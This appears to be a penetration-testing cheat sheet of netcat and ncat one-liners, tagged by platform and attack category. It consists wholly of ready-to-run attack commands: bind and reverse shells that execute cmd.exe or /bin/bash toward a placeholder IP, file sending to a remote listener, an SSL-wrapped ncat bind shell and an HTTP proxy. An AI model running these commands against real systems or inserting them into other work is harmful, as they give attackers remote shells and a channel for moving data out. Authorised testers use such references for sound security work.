# netcat

% nc, netcat

#platform/linux #target/remote  #cat/ATTACK/LISTEN-SERVE 
## nc setup listener
```
nc -nlvp <lport>
```

## nc bind shell windows
#platform/windows 
```
nc -nlvp <port> -e cmd.exe
```

## nc bind shell linux
#platform/linux
```
nc -nlvp <port> -e /bin/bash
```

## nc reverse shell windows
#platform/windows  #cat/ATTACK/REVERSE_SHELL 
```
nc -nv <ip> <port> -e cmd.exe
```

## nc reverse shell linux
#platform/linux #cat/ATTACK/REVERSE_SHELL 
```
nc -nv <ip> <port> -e /bin/bash
```

## nc transfer file - receiver
#platform/linux #cat/ATTACK/FILE_TRANSFERT 
```
nc -nlvp <port> > <incomming_file>
```

## nc transfer file - sender
#platform/linux #cat/ATTACK/FILE_TRANSFERT 
```
nc -nv <ip> <port> < <file_to_send>
```

# ncat

% ncat

## ncat bind shell ssl filtered
#platform/linux #cat/ATTACK/LISTEN-SERVE 
```
ncat --exec cmd.exe --allow <allowed_ip> -vnl <port> --ssl
```

## ncat bind shell ssl connection
#platform/linux #cat/ATTACK/LISTEN-SERVE 
```
ncat -v <ip> <port> --ssl
```

## ncat HTTP WEB proxy
#platform/linux #cat/ATTACK/LISTEN-SERVE 
```
ncat --listen --proxy-type http <port>
```

